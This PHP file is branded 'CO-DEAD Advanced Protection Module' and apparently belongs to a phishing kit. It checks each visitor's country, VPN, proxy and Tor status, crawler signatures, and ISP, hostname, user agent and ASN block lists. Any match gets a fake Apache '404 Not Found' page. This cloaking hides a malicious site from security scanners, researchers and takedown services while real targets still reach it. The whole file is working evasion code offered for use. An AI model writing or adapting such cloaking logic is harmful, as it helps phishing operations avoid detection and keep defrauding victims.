<?php

/**
_________  ________             ________  ___________   _____  ________   
\_   ___ \ \_____  \            \______ \ \_   _____/  /  _  \ \______ \  
/    \  \/  /   |   \    ______  |    |  \ |    __)_  /  /_\  \ |    |  \ 
\     \____/    |    \  /_____/  |    `   \|        \/    |    \|    `   \
 \______  /\_______  /          /_______  /_______  /\____|__  /_______  /
        \/         \/                   \/        \/         \/        \/ 
		
			ICQ & Telegram = @CO_DEAD
            CO-DEAD Advanced Protection Module

            
 * DO NOT SELL THIS SCRIPT !
 * DO NOT CHANGE COPYRIGHT !
            
**/ 
require __DIR__."/config.php";
require __DIR__."/ipinfo.php";
if ($countryblock == "on") {
    if ($whichcountry != $ccode) {
        die(
            "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this blocker server.</p><p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request. country blocked</p></body></html>"
        );
    }
}
if ($ipquality == "on") {
    require __DIR__."/qualitycheck.php";
}
if ($vpndetect == "on") {
    require __DIR__."/ipdetect.php";
    if ($vpn == "1") {
        die(
            "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this blocker server.</p><p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request. VPN found</p></body></html>"
        );
    }
}
if ($proxydetect == "on") {
    require __DIR__."/ipdetect.php";
    if ($proxy == "1") {
        die(
            "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this blocker server.</p><p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request. Proxy found</p></body></html>"
        );
    }
}
if ($tordetetct == "on") {
    require __DIR__."/ipdetect.php";
    if ($tor == "1") {
        die(
            "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this blocker server.</p><p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request. TOR found</p></body></html>"
        );
    }
}
if ($crawlerdetect == "on") {
    require __DIR__."/crawlerdetect.php";
}
if ($crawlerdetect2 == "on") {
    require __DIR__."/crawlerdetectapi.php";
    if ($is_crawler == "1") {
        die(
            "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this blocker server.</p><p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request. crawler 2 found</p></body></html>"
        );
    }
}
if ($badisp == "on") {
    require_once __DIR__."/adv.php";
    foreach ($blocker_isp as $ispbot) {
        if (substr_count($ispbot, $isp) > 0) {
            die(
                "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this blocker server.</p><p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request. badisp found</p></body></html>"
            );
        }
    }
}
if ($badhost == "on") {
    require_once __DIR__."/adv.php";
    foreach ($blocker_hostname as $hostbot) {
        if (substr_count($hostbot, $hostname) > 0) {
            die(
                "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this blocker server.</p><p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request. bad host found</p></body></html>"
            );
        }
    }
}
if ($badua == "on") {
    require_once __DIR__."/adv.php";
    foreach ($blocker_uafull as $uanew) {
        if (substr_count(strtolower($uanew), $ua) > 0) {
            die(
                "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this blocker server.</p><p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request. bad ua found</p></body></html>"
            );
        }
    }
}
if ($badasn == "on") {
    require_once __DIR__."/adv.php";
    foreach ($blocker_asn as $asnbot) {
        if (substr_count($asn, $asnbot) > 0) {
            die(
                "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this blocker server.</p><p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request. bad asn found</p></body></html>"
            );
        }
    }
}
if ($ondb == "on") {
    require __DIR__."/advip.php";
}